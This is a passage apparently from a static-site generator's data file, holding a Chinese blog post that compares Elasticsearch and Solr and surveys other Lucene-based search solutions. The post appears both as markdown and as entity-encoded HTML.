Elasticsearch具有明显的优势。\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/2.png)\n随着数据量的增加，Solr的搜索效率会变得更低，而Elasticsearch却没有明显的变化。\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/3.png)\n综上所述，Solr的架构不适合实时搜索的应用。\n\n下图为将搜索引擎从Solr转到Elasticsearch以后的平均查询速度有了50倍的提升。\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/4.png)\n\n#### Elasticsearch 与 Solr 的比较总结\n- 二者安装都很简单；\n- Solr 利用 Zookeeper 进行分布式管理，而 Elasticsearch 自身带有分布式协调管理功能;\n- Solr 支持更多格式的数据，而 Elasticsearch 仅支持json文件格式；\n- Solr 官方提供的功能更多，而 Elasticsearch 本身更注重于核心功能，高级功能多有第三方插件提供；\n- Solr 在传统的搜索应用中表现好于 Elasticsearch，但在处理实时搜索应用时效率明显低于 Elasticsearch。\n- Solr 是传统搜索应用的有力解决方案，但 Elasticsearch 更适用于新兴的实时搜索应用。\n\n- - -\n\n## 其他基于Lucene的开源搜索引擎解决方案\n#### Lucene\n说明：Lucene 是一个 JAVA 搜索类库，它本身并不是一个完整的解决方案，需要额外的开发工作。\n优点：成熟的解决方案，有很多的成功案例。apache 顶级项目，正在持续快速的进步。庞大而活跃的开发社区，大量的开发人员。它只是一个类库，有足够的定制和优化空间：经过简单定制，就可以满足绝大部分常见的需求；经过优化，可以支持 10亿+ 量级的搜索。\n缺点：需要额外的开发工作。所有的扩展，分布式，可靠性等都需要自己实现；非实时，从建索引到可以搜索中间有一个时间延迟，而当前的“近实时”(Lucene Near Real Time search)搜索方案的可扩展性有待进一步完善\n\n#### Katta\n说明：基于 Lucene 的，支持分布式，可扩展，具有容错功能，准实时的搜索方案。\n优点：开箱即用，可以与 Hadoop 配合实现分布式。具备扩展和容错机制。\n缺点：只是搜索方案，建索引部分还是需要自己实现。在搜索功能上，只实现了最基本的需求。成功案例较少，项目的成熟度稍微差一些。因为需要支持分布式，对于一些复杂的查询需求，定制的难度会比较大。\n\n#### Hadoop contrib/index\n说明：Map/Reduce 模式的，分布式建索引方案，可以跟 Katta 配合使用。\n优点：分布式建索引，具备可扩展性。\n缺点：只是建索引方案，不包括搜索实现。工作在批处理模式，对实时搜索的支持不佳。\n\n#### LinkedIn 的开源方案\n说明：基于 Lucene 的一系列解决方案，包括 准实时搜索 zoie ，facet 搜索实现 bobo ，机器学习算法 decomposer ，摘要存储库 krati ，数据库模式包装 sensei 等等\n优点：经过验证的解决方案，支持分布式，可扩展，丰富的功能实现\n缺点：与 linkedin 公司的联系太紧密，可定制性比较差\n\n#### Lucandra\n说明：基于 Lucene，索引存在 cassandra 数据库中\n优点：参考 cassandra 的优点\n缺点：参考 cassandra 的缺点。另外，这只是一个 demo，没有经过大量验证\n\n#### HBasene\n说明：基于 Lucene，索引存在 HBase 数据库中\n优点：参考 HBase 的优点\n缺点：参考 HBase 的缺点。另外，在实现中，lucene terms 是存成行，但每个 term 对应的 posting lists 是以列的方式存储的。随着单个 term 的 posting lists 的增大，查询时的速度受到的影响会非常大","slug":"Elasticsearch与Solr","published":1,"updated":"2016-11-17T11:59:42.663Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulal000bgwtmc252k15c","content":"<blockquote>\n<p>&#x516C;&#x53F8;&#x4E4B;&#x524D;&#x6709;&#x4E2A;&#x7528;Lucene&#x5B9E;&#x73B0;&#x7684;&#x4F2A;&#x5206;&#x5E03;&#x5F0F;&#x9879;&#x76EE;&#xFF0C;&#x5B9E;&#x65F6;&#x6027;&#x5F88;&#x5DEE;&#xFF0C;&#x540E;&#x671F;&#x6570;&#x636E;&#x91CF;&#x9010;&#x6E10;&#x589E;&#x5927;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6570;&#x636E;&#x540C;&#x6B65;&#x4E00;&#x6B21;&#x9700;&#x8981;&#x5341;&#x51E0;&#x5C0F;&#x65F6;&#x3002;&#x5F53;&#x65F6;&#x9879;&#x76EE;&#x91CD;&#x6784;&#x8003;&#x8651;&#x5230;&#x7684;&#x662F;Solr&#x548C;ES&#xFF0C;&#x6211;&#x53C2;&#x4E0E;&#x7684;&#x662F;Solr&#x6280;&#x672F;&#x7684;&#x9884;&#x7814;&#x3002;&#x56E0;&#x4E3A;&#x9879;&#x76EE;&#x5B9E;&#x65F6;&#x6027;&#x8981;&#x6C42;&#x5F88;&#x9AD8;&#xFF0C;&#x6700;&#x7EC8;&#x9009;&#x62E9;&#x7684;&#x662F;ES&#x3002;</p>\n</blockquote>\n<h2 id=\"Elasticsearch\"><a href=\"#Elasticsearch\" class=\"headerlink\" title=\"Elasticsearch\"></a>Elasticsearch</h2><h4 id=\"&#x7B80;&#x4ECB;\"><a href=\"#&#x7B80;&#x4ECB;\" class=\"headerlink\" title=\"&#x7B80;&#x4ECB;\"></a>&#x7B80;&#x4ECB;</h4><p>Elasticsearch&#x662F;&#x4E00;&#x4E2A;&#x5B9E;&#x65F6;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x548C;&#x5206;&#x6790;&#x5F15;&#x64CE;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x4F60;&#x7528;&#x524D;&#x6240;&#x672A;&#x6709;&#x7684;&#x901F;&#x5EA6;&#x53BB;&#x5904;&#x7406;&#x5927;&#x89C4;&#x6A21;&#x6570;&#x636E;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5168;&#x6587;&#x641C;&#x7D22;&#xFF0C;&#x7ED3;&#x6784;&#x5316;&#x641C;&#x7D22;&#x4EE5;&#x53CA;&#x5206;&#x6790;&#xFF0C;&#x5F53;&#x7136;&#x4F60;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x8FD9;&#x4E09;&#x8005;&#x8FDB;&#x884C;&#x7EC4;&#x5408;&#x3002;</p>\n<p>Elasticsearch&#x662F;&#x4E00;&#x4E2A;&#x5EFA;&#x7ACB;&#x5728;&#x5168;&#x6587;&#x641C;&#x7D22;&#x5F15;&#x64CE; Apache Lucene&#x2122; &#x57FA;&#x7840;&#x4E0A;&#x7684;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;Lucene&#x662F;&#x5F53;&#x4ECA;&#x6700;&#x5148;&#x8FDB;&#xFF0C;&#x6700;&#x9AD8;&#x6548;&#x7684;&#x5168;&#x529F;&#x80FD;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x6846;&#x67B6;&#x3002;&#x4F46;&#x662F;Lucene&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x6846;&#x67B6;&#xFF0C;&#x8981;&#x5145;&#x5206;&#x5229;&#x7528;&#x5B83;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x9700;&#x8981;&#x4F7F;&#x7528;JAVA&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x7A0B;&#x5E8F;&#x4E2D;&#x96C6;&#x6210;Lucene&#x3002;&#x9700;&#x8981;&#x5F88;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x4E86;&#x89E3;&#xFF0C;&#x624D;&#x80FD;&#x660E;&#x767D;&#x5B83;&#x662F;&#x5982;&#x4F55;&#x8FD0;&#x884C;&#x7684;&#xFF0C;Lucene&#x786E;&#x5B9E;&#x975E;&#x5E38;&#x590D;&#x6742;&#x3002;</p>\n<p>Elasticsearch&#x4F7F;&#x7528;Lucene&#x4F5C;&#x4E3A;&#x5185;&#x90E8;&#x5F15;&#x64CE;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x4F7F;&#x7528;&#x5B83;&#x505A;&#x5168;&#x6587;&#x641C;&#x7D22;&#x65F6;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7EDF;&#x4E00;&#x5F00;&#x53D1;&#x597D;&#x7684;API&#x5373;&#x53EF;&#xFF0C;&#x800C;&#x4E0D;&#x9700;&#x8981;&#x4E86;&#x89E3;&#x5176;&#x80CC;&#x540E;&#x590D;&#x6742;&#x7684;Lucene&#x7684;&#x8FD0;&#x884C;&#x539F;&#x7406;&#x3002;</p>\n<a id=\"more\"></a>\n<p>&#x5F53;&#x7136;Elasticsearch&#x5E76;&#x4E0D;&#x4EC5;&#x4EC5;&#x662F;Lucene&#x8FD9;&#x4E48;&#x7B80;&#x5355;&#xFF0C;&#x5B83;&#x4E0D;&#x4F46;&#x5305;&#x62EC;&#x4E86;&#x5168;&#x6587;&#x641C;&#x7D22;&#x529F;&#x80FD;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4EE5;&#x4E0B;&#x5DE5;&#x4F5C;:<br>1&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x5B9E;&#x65F6;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#xFF0C;&#x5E76;&#x5C06;&#x6BCF;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x90FD;&#x7F16;&#x5165;&#x7D22;&#x5F15;&#xFF0C;&#x4F7F;&#x5176;&#x53EF;&#x4EE5;&#x88AB;&#x641C;&#x7D22;&#x3002;<br>2&#x3001;&#x5B9E;&#x65F6;&#x5206;&#x6790;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x3002;<br>3&#x3001;&#x53EF;&#x4EE5;&#x6269;&#x5C55;&#x5230;&#x4E0A;&#x767E;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5904;&#x7406;PB&#x7EA7;&#x522B;&#x7684;&#x7ED3;&#x6784;&#x5316;&#x6216;&#x975E;&#x7ED3;&#x6784;&#x5316;&#x6570;&#x636E;&#x3002;</p>\n<p>&#x8FD9;&#x4E48;&#x591A;&#x7684;&#x529F;&#x80FD;&#x88AB;&#x96C6;&#x6210;&#x5230;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x5730;&#x901A;&#x8FC7;&#x5BA2;&#x6237;&#x7AEF;&#x6216;&#x8005;&#x4EFB;&#x4F55;&#x4F60;&#x559C;&#x6B22;&#x7684;&#x7A0B;&#x5E8F;&#x8BED;&#x8A00;&#x4E0E;ES&#x7684;RESTful API&#x8FDB;&#x884C;&#x4EA4;&#x6D41;&#x3002;Elasticsearch&#x7684;&#x4E0A;&#x624B;&#x662F;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x7684;&#x3002;&#x5B83;&#x9644;&#x5E26;&#x4E86;&#x5F88;&#x591A;&#x975E;&#x5E38;&#x5408;&#x7406;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x8FD9;&#x8BA9;&#x521D;&#x5B66;&#x8005;&#x5F88;&#x597D;&#x5730;&#x907F;&#x514D;&#x4E00;&#x4E0A;&#x624B;&#x5C31;&#x8981;&#x9762;&#x5BF9;&#x590D;&#x6742;&#x7684;&#x7406;&#x8BBA;&#xFF0C;&#x5B83;&#x5B89;&#x88C5;&#x597D;&#x4E86;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E86;&#xFF0C;&#x7528;&#x5F88;&#x5C0F;&#x7684;&#x5B66;&#x4E60;&#x6210;&#x672C;&#x5C31;&#x53EF;&#x4EE5;&#x53D8;&#x5F97;&#x5F88;&#x6709;&#x751F;&#x4EA7;&#x529B;&#x3002;</p>\n<p>&#x968F;&#x7740;&#x8D8A;&#x5B66;&#x8D8A;&#x6DF1;&#x5165;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;Elasticsearch&#x66F4;&#x591A;&#x9AD8;&#x7EA7;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x6574;&#x4E2A;&#x5F15;&#x64CE;&#x53EF;&#x4EE5;&#x5F88;&#x7075;&#x6D3B;&#x5730;&#x8FDB;&#x884C;&#x914D;&#x7F6E;&#x3002;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x81EA;&#x8EAB;&#x9700;&#x6C42;&#x6765;&#x5B9A;&#x5236;&#x5C5E;&#x4E8E;&#x81EA;&#x5DF1;&#x7684;Elasticsearch&#x3002;</p>\n<p>&#x4F7F;&#x7528;&#x6848;&#x4F8B;&#xFF1A;<br>1&#x3001;&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x4F7F;&#x7528;Elasticsearch&#x6765;&#x8FDB;&#x884C;&#x5168;&#x6587;&#x641C;&#x505A;&#x5E76;&#x9AD8;&#x4EAE;&#x663E;&#x793A;&#x5173;&#x952E;&#x8BCD;&#xFF0C;&#x4EE5;&#x53CA;&#x63D0;&#x4F9B;search-as-you-type&#x3001;did-you-mean&#x7B49;&#x641C;&#x7D22;&#x5EFA;&#x8BAE;&#x529F;&#x80FD;&#x3002;<br>2&#x3001;&#x82F1;&#x56FD;&#x536B;&#x62A5;&#x4F7F;&#x7528;Elasticsearch&#x6765;&#x5904;&#x7406;&#x8BBF;&#x5BA2;&#x65E5;&#x5FD7;&#xFF0C;&#x4EE5;&#x4FBF;&#x80FD;&#x5C06;&#x516C;&#x4F17;&#x5BF9;&#x4E0D;&#x540C;&#x6587;&#x7AE0;&#x7684;&#x53CD;&#x5E94;&#x5B9E;&#x65F6;&#x5730;&#x53CD;&#x9988;&#x7ED9;&#x5404;&#x4F4D;&#x7F16;&#x8F91;&#x3002;<br>3&#x3001;StackOverflow&#x5C06;&#x5168;&#x6587;&#x641C;&#x7D22;&#x4E0E;&#x5730;&#x7406;&#x4F4D;&#x7F6E;&#x548C;&#x76F8;&#x5173;&#x4FE1;&#x606F;&#x8FDB;&#x884C;&#x7ED3;&#x5408;&#xFF0C;&#x4EE5;&#x63D0;&#x4F9B;more-like-this&#x76F8;&#x5173;&#x95EE;&#x9898;&#x7684;&#x5C55;&#x73B0;&#x3002;<br>4&#x3001;GitHub&#x4F7F;&#x7528;Elasticsearch&#x6765;&#x68C0;&#x7D22;&#x8D85;&#x8FC7;1300&#x4EBF;&#x884C;&#x4EE3;&#x7801;&#x3002;<br>5&#x3001;&#x6BCF;&#x5929;&#xFF0C;Goldman Sachs&#x4F7F;&#x7528;&#x5B83;&#x6765;&#x5904;&#x7406;5TB&#x6570;&#x636E;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x6295;&#x884C;&#x4F7F;&#x7528;&#x5B83;&#x6765;&#x5206;&#x6790;&#x80A1;&#x7968;&#x5E02;&#x573A;&#x7684;&#x53D8;&#x52A8;&#x3002;<br>&#x4F46;&#x662F;Elasticsearch&#x5E76;&#x4E0D;&#x53EA;&#x662F;&#x9762;&#x5411;&#x5927;&#x578B;&#x4F01;&#x4E1A;&#x7684;&#xFF0C;&#x5B83;&#x8FD8;&#x5E2E;&#x52A9;&#x4E86;&#x5F88;&#x591A;&#x7C7B;&#x4F3C;DataDog&#x4EE5;&#x53CA;Klout&#x7684;&#x521B;&#x4E1A;&#x516C;&#x53F8;&#x8FDB;&#x884C;&#x4E86;&#x529F;&#x80FD;&#x7684;&#x6269;&#x5C55;&#x3002;</p>\n<h4 id=\"&#x4F18;&#x70B9;\"><a href=\"#&#x4F18;&#x70B9;\" class=\"headerlink\" title=\"&#x4F18;&#x70B9;\"></a>&#x4F18;&#x70B9;</h4><ul>\n<li>Elasticsearch&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x3002;&#x4E0D;&#x9700;&#x8981;&#x5176;&#x4ED6;&#x7EC4;&#x4EF6;&#xFF0C;&#x5206;&#x53D1;&#x662F;&#x5B9E;&#x65F6;&#x7684;&#xFF0C;&#x88AB;&#x53EB;&#x505A;&#x201D;Push replication&#x201D;&#x3002;</li>\n<li>Elasticsearch &#x5B8C;&#x5168;&#x652F;&#x6301; Apache Lucene &#x7684;&#x63A5;&#x8FD1;&#x5B9E;&#x65F6;&#x7684;&#x641C;&#x7D22;&#x3002;</li>\n<li>&#x5904;&#x7406;&#x591A;&#x79DF;&#x6237;&#xFF08;multitenancy&#xFF09;&#x4E0D;&#x9700;&#x8981;&#x7279;&#x6B8A;&#x914D;&#x7F6E;&#xFF0C;&#x800C;Solr&#x5219;&#x9700;&#x8981;&#x66F4;&#x591A;&#x7684;&#x9AD8;&#x7EA7;&#x8BBE;&#x7F6E;&#x3002;</li>\n<li>Elasticsearch &#x91C7;&#x7528; Gateway &#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x4F7F;&#x5F97;&#x5B8C;&#x5907;&#x4EFD;&#x66F4;&#x52A0;&#x7B80;&#x5355;&#x3002;</li>\n<li>&#x5404;&#x8282;&#x70B9;&#x7EC4;&#x6210;&#x5BF9;&#x7B49;&#x7684;&#x7F51;&#x7EDC;&#x7ED3;&#x6784;&#xFF0C;&#x67D0;&#x4E9B;&#x8282;&#x70B9;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x5206;&#x914D;&#x5176;&#x4ED6;&#x8282;&#x70B9;&#x4EE3;&#x66FF;&#x5176;&#x8FDB;&#x884C;&#x5DE5;&#x4F5C;&#x3002;</li>\n</ul>\n<h4 id=\"&#x7F3A;&#x70B9;\"><a href=\"#&#x7F3A;&#x70B9;\" class=\"headerlink\" title=\"&#x7F3A;&#x70B9;\"></a>&#x7F3A;&#x70B9;</h4><ul>\n<li>&#x53EA;&#x6709;&#x4E00;&#x540D;&#x5F00;&#x53D1;&#x8005;&#xFF08;&#x5F53;&#x524D;Elasticsearch GitHub&#x7EC4;&#x7EC7;&#x5DF2;&#x7ECF;&#x4E0D;&#x53EA;&#x5982;&#x6B64;&#xFF0C;&#x5DF2;&#x7ECF;&#x6709;&#x4E86;&#x76F8;&#x5F53;&#x6D3B;&#x8DC3;&#x7684;&#x7EF4;&#x62A4;&#x8005;&#xFF09;</li>\n<li>&#x8FD8;&#x4E0D;&#x591F;&#x81EA;&#x52A8;&#xFF08;&#x4E0D;&#x9002;&#x5408;&#x5F53;&#x524D;&#x65B0;&#x7684;Index Warmup API&#xFF09;</li>\n</ul>\n<hr>\n<h2 id=\"Solr\"><a href=\"#Solr\" class=\"headerlink\" title=\"Solr\"></a>Solr</h2><h4 id=\"&#x7B80;&#x4ECB;-1\"><a href=\"#&#x7B80;&#x4ECB;-1\" class=\"headerlink\" title=\"&#x7B80;&#x4ECB;\"></a>&#x7B80;&#x4ECB;</h4><p>Solr&#xFF08;&#x8BFB;&#x4F5C;&#x201C;solar&#x201D;&#xFF09;&#x662F;Apache Lucene&#x9879;&#x76EE;&#x7684;&#x5F00;&#x6E90;&#x4F01;&#x4E1A;&#x641C;&#x7D22;&#x5E73;&#x53F0;&#x3002;<br>&#x5176;&#x4E3B;&#x8981;&#x529F;&#x80FD;&#x5305;&#x62EC;&#x5168;&#x6587;&#x68C0;&#x7D22;&#x3001;&#x547D;&#x4E2D;&#x6807;&#x793A;&#x3001;&#x5206;&#x9762;&#x641C;&#x7D22;&#x3001;&#x52A8;&#x6001;&#x805A;&#x7C7B;&#x3001;&#x6570;&#x636E;&#x5E93;&#x96C6;&#x6210;&#xFF0C;&#x4EE5;&#x53CA;&#x5BCC;&#x6587;&#x672C;&#xFF08;&#x5982;Word&#x3001;PDF&#xFF09;&#x7684;&#x5904;&#x7406;&#x3002;<br>Solr&#x662F;&#x9AD8;&#x5EA6;&#x53EF;&#x6269;&#x5C55;&#x7684;&#xFF0C;&#x5E76;&#x63D0;&#x4F9B;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x641C;&#x7D22;&#x548C;&#x7D22;&#x5F15;&#x590D;&#x5236;&#x3002;<br>Solr&#x662F;&#x6700;&#x6D41;&#x884C;&#x7684;&#x4F01;&#x4E1A;&#x7EA7;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#xFF0C;Solr4 &#x8FD8;&#x589E;&#x52A0;&#x4E86;NoSQL&#x652F;&#x6301;&#x3002;<br>Solr&#x662F;&#x7528;Java&#x7F16;&#x5199;&#x3001;&#x8FD0;&#x884C;&#x5728;Servlet&#x5BB9;&#x5668;&#xFF08;&#x5982; Apache Tomcat &#x6216;Jetty&#xFF09;&#x7684;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;&#x5168;&#x6587;&#x641C;&#x7D22;&#x670D;&#x52A1;&#x5668;&#x3002;<br>Solr&#x91C7;&#x7528;&#x4E86; Lucene Java&#x641C;&#x7D22;&#x5E93;&#x4E3A;&#x6838;&#x5FC3;&#x7684;&#x5168;&#x6587;&#x7D22;&#x5F15;&#x548C;&#x641C;&#x7D22;&#xFF0C;&#x5E76;&#x5177;&#x6709;&#x7C7B;&#x4F3C;REST&#x7684;HTTP/XML&#x548C;JSON&#x7684;API&#x3002;<br>Solr&#x5F3A;&#x5927;&#x7684;&#x5916;&#x90E8;&#x914D;&#x7F6E;&#x529F;&#x80FD;&#x4F7F;&#x5F97;&#x65E0;&#x9700;&#x8FDB;&#x884C;Java&#x7F16;&#x7801;&#xFF0C;&#x4FBF;&#x53EF;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x8C03;&#x6574;&#x4EE5;&#x9002;&#x5E94;&#x591A;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;Solr&#x6709;&#x4E00;&#x4E2A;&#x63D2;&#x4EF6;&#x67B6;&#x6784;&#xFF0C;&#x4EE5;&#x652F;&#x6301;&#x66F4;&#x591A;&#x7684;&#x9AD8;&#x7EA7;&#x5B9A;&#x5236;&#x3002;</p>\n<p>&#x56E0;&#x4E3A;2010&#x5E74; Apache Lucene &#x548C; Apache Solr &#x9879;&#x76EE;&#x5408;&#x5E76;&#xFF0C;&#x4E24;&#x4E2A;&#x9879;&#x76EE;&#x662F;&#x7531;&#x540C;&#x4E00;&#x4E2A;Apache&#x8F6F;&#x4EF6;&#x57FA;&#x91D1;&#x4F1A;&#x5F00;&#x53D1;&#x56E2;&#x961F;&#x5236;&#x4F5C;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x63D0;&#x5230;&#x6280;&#x672F;&#x6216;&#x4EA7;&#x54C1;&#x65F6;&#xFF0C;Lucene/Solr&#x6216;Solr/Lucene&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002;</p>\n<h4 id=\"&#x4F18;&#x70B9;-1\"><a href=\"#&#x4F18;&#x70B9;-1\" class=\"headerlink\" title=\"&#x4F18;&#x70B9;\"></a>&#x4F18;&#x70B9;</h4><ul>\n<li>Solr&#x6BD4;&#x8F83;&#x6210;&#x719F;&#x3001;&#x7A33;&#x5B9A;&#x3002;</li>\n<li>Solr&#x6709;&#x4E00;&#x4E2A;&#x66F4;&#x5927;&#x3001;&#x66F4;&#x6210;&#x719F;&#x7684;&#x7528;&#x6237;&#x3001;&#x5F00;&#x53D1;&#x548C;&#x8D21;&#x732E;&#x8005;&#x793E;&#x533A;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x6DFB;&#x52A0;&#x591A;&#x79CD;&#x683C;&#x5F0F;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x5982;&#xFF1A;HTML&#x3001;PDF&#x3001;&#x5FAE;&#x8F6F; Office &#x7CFB;&#x5217;&#x8F6F;&#x4EF6;&#x683C;&#x5F0F;&#x4EE5;&#x53CA; JSON&#x3001;XML&#x3001;CSV &#x7B49;&#x7EAF;&#x6587;&#x672C;&#x683C;&#x5F0F;&#x3002;</li>\n<li>&#x4E0D;&#x8003;&#x8651;&#x5EFA;&#x7D22;&#x5F15;&#x7684;&#x540C;&#x65F6;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#xFF0C;&#x901F;&#x5EA6;&#x66F4;&#x5FEB;&#x3002;</li>\n</ul>\n<h4 id=\"&#x7F3A;&#x70B9;-1\"><a href=\"#&#x7F3A;&#x70B9;-1\" class=\"headerlink\" title=\"&#x7F3A;&#x70B9;\"></a>&#x7F3A;&#x70B9;</h4><p><strong>&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x65F6;&#xFF0C;&#x641C;&#x7D22;&#x6548;&#x7387;&#x4E0B;&#x964D;&#xFF0C;&#x5B9E;&#x65F6;&#x7D22;&#x5F15;&#x641C;&#x7D22;&#x6548;&#x7387;&#x4E0D;&#x9AD8;&#x3002;</strong></p>\n<hr>\n<h2 id=\"Elasticsearch&#x4E0E;Solr&#x7684;&#x6BD4;&#x8F83;\"><a href=\"#Elasticsearch&#x4E0E;Solr&#x7684;&#x6BD4;&#x8F83;\" class=\"headerlink\" title=\"Elasticsearch&#x4E0E;Solr&#x7684;&#x6BD4;&#x8F83;\"></a>Elasticsearch&#x4E0E;Solr&#x7684;&#x6BD4;&#x8F83;</h2><p>&#x5F53;&#x5355;&#x7EAF;&#x7684;&#x5BF9;&#x5DF2;&#x6709;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#x65F6;&#xFF0C;Solr&#x66F4;&#x5FEB;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/1.png\" alt=\"&#x56FE;&#x7247;1\"><br>&#x5F53;&#x5B9E;&#x65F6;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x65F6;, Solr&#x4F1A;&#x4EA7;&#x751F;io&#x963B;&#x585E;&#xFF0C;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x8F83;&#x5DEE;, Elasticsearch&#x5177;&#x6709;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/2.png\" alt=\"&#x56FE;&#x7247;2\"><br>&#x968F;&#x7740;&#x6570;&#x636E;&#x91CF;&#x7684;&#x589E;&#x52A0;&#xFF0C;Solr&#x7684;&#x641C;&#x7D22;&#x6548;&#x7387;&#x4F1A;&#x53D8;&#x5F97;&#x66F4;&#x4F4E;&#xFF0C;&#x800C;Elasticsearch&#x5374;&#x6CA1;&#x6709;&#x660E;&#x663E;&#x7684;&#x53D8;&#x5316;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/3.png\" alt=\"&#x56FE;&#x7247;3\"><br>&#x7EFC;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;Solr&#x7684;&#x67B6;&#x6784;&#x4E0D;&#x9002;&#x5408;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x7684;&#x5E94;&#x7528;&#x3002;</p>\n<p>&#x4E0B;&#x56FE;&#x4E3A;&#x5C06;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x4ECE;Solr&#x8F6C;&#x5230;Elasticsearch&#x4EE5;&#x540E;&#x7684;&#x5E73;&#x5747;&#x67E5;&#x8BE2;&#x901F;&#x5EA6;&#x6709;&#x4E86;50&#x500D;&#x7684;&#x63D0;&#x5347;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<h4 id=\"Elasticsearch-&#x4E0E;-Solr-&#x7684;&#x6BD4;&#x8F83;&#x603B;&#x7ED3;\"><a href=\"#Elasticsearch-&#x4E0E;-Solr-&#x7684;&#x6BD4;&#x8F83;&#x603B;&#x7ED3;\" class=\"headerlink\" title=\"Elasticsearch &#x4E0E; Solr &#x7684;&#x6BD4;&#x8F83;&#x603B;&#x7ED3;\"></a>Elasticsearch &#x4E0E; Solr &#x7684;&#x6BD4;&#x8F83;&#x603B;&#x7ED3;</h4><ul>\n<li>&#x4E8C;&#x8005;&#x5B89;&#x88C5;&#x90FD;&#x5F88;&#x7B80;&#x5355;&#xFF1B;</li>\n<li>Solr &#x5229;&#x7528; Zookeeper &#x8FDB;&#x884C;&#x5206;&#x5E03;&#x5F0F;&#x7BA1;&#x7406;&#xFF0C;&#x800C; Elasticsearch &#x81EA;&#x8EAB;&#x5E26;&#x6709;&#x5206;&#x5E03;&#x5F0F;&#x534F;&#x8C03;&#x7BA1;&#x7406;&#x529F;&#x80FD;;</li>\n<li>Solr &#x652F;&#x6301;&#x66F4;&#x591A;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C; Elasticsearch &#x4EC5;&#x652F;&#x6301;json&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#xFF1B;</li>\n<li>Solr &#x5B98;&#x65B9;&#x63D0;&#x4F9B;&#x7684;&#x529F;&#x80FD;&#x66F4;&#x591A;&#xFF0C;&#x800C; Elasticsearch &#x672C;&#x8EAB;&#x66F4;&#x6CE8;&#x91CD;&#x4E8E;&#x6838;&#x5FC3;&#x529F;&#x80FD;&#xFF0C;&#x9AD8;&#x7EA7;&#x529F;&#x80FD;&#x591A;&#x6709;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#x63D0;&#x4F9B;&#xFF1B;</li>\n<li>Solr &#x5728;&#x4F20;&#x7EDF;&#x7684;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x4E2D;&#x8868;&#x73B0;&#x597D;&#x4E8E; Elasticsearch&#xFF0C;&#x4F46;&#x5728;&#x5904;&#x7406;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x65F6;&#x6548;&#x7387;&#x660E;&#x663E;&#x4F4E;&#x4E8E; 